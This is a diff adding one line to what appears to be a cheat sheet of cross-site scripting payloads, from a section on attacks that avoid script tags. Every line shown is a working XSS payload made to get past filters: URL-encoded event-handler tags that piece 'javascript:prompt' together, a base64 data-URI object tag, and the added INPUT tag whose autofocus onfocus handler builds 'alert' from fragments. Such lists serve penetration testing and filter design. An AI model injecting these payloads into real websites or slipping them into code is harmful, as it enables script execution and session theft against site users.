@@ -267,6 +267,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %22%3E%3Cxss%20contenteditable%20onbeforeinput=%22a='promp';f='t';b='%26%230000000040';c='1';d='%26%230000000041';e='javascript:';location=e%2Ba%2Bf%2Bb%2Bc%2Bd%22%3EGREPSTRING%3C
   %22%3E%3Cxss%20contenteditable%20onbeforeinput=%22a='promp';f='t';b='(';c='1';d=')';e='javascript:';location=e%2Ba%2Bf%2Bb%2Bc%2Bd%22%3EGREPSTRING%3C
   <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+  1'"><INPUT HRef=\" AutoFocus OnFocus="var a='ale';var b='rt';var c='()';top[a+b]`11`"><"
   ```
 </details>
 
